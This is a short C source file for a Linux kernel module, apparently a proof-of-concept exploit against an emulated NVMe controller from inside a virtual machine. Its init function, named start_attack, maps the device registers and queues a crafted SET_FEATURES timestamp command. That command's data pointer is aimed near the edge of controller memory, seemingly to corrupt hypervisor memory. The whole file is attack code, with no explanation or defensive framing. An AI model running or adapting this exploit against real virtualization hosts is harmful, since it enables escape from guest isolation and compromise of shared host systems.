#include <linux/module.h>
#include <linux/init.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <asm/io.h>
#include "exp.h"

#define MEM_BASE 0xfebf0000
#define MEM_BASE_LEN 0x2000
#define CTRL_MEM_BASE 0xfe000000
#define CTRL_MEM_LEN 0x100000

void *mem_area = NULL;
NvmeBar *nvmebar;
void *bar_asq;
void *phy_bar_asq;

static void memory_init(void){
    mem_area = ioremap(MEM_BASE,MEM_BASE_LEN);
    nvmebar = kmalloc(sizeof(NvmeBar),GFP_KERNEL);
    bar_asq = kmalloc(0x1000,GFP_KERNEL);

    phy_bar_asq = (void *)virt_to_phys(bar_asq);

    memset(nvmebar,0,sizeof(NvmeBar));
    memset(bar_asq,0,0x1000);
}

static int main_main(void){ // sizeof(n->bar) = 0x3f
    NvmeCmd *nvmecmd;

    memset(nvmebar,0,sizeof(NvmeBar));
    memset(bar_asq,0,0x1000);

    nvmebar->cc = (6<<16) | (4<<20) | 1;
    nvmebar->aqa = 0x040040; // sq and cq size
    nvmebar->asq = (u64)phy_bar_asq; // sq->dma_addr

    nvmecmd = (NvmeCmd *)bar_asq;
    nvmecmd->opcode = NVME_ADM_CMD_SET_FEATURES;
    nvmecmd->cdw10 = NVME_TIMESTAMP;
    nvmecmd->prp1 = CTRL_MEM_BASE + (0x1000-7);
    nvmecmd->prp2 = 0;

    writel(nvmebar->aqa,mem_area+0x24);
    writel((nvmebar->asq & 0xffffffff),mem_area+0x28);
    writel((nvmebar->asq >> 32),mem_area+0x2c);
    writel(0x0,mem_area+0x14); // clear_ctrl
    writel(nvmebar->cc,mem_area+0x14);
    writel(1,mem_area+0x1000); // tail = 1

    return 0;
}

static int start_attack(void){
    memory_init();
    main_main();

    return 0;
}

static void exit_attack(void)
{
	printk("exp exit.\n");
}

module_init(start_attack);
module_exit(exit_attack);

MODULE_LICENSE("GPL");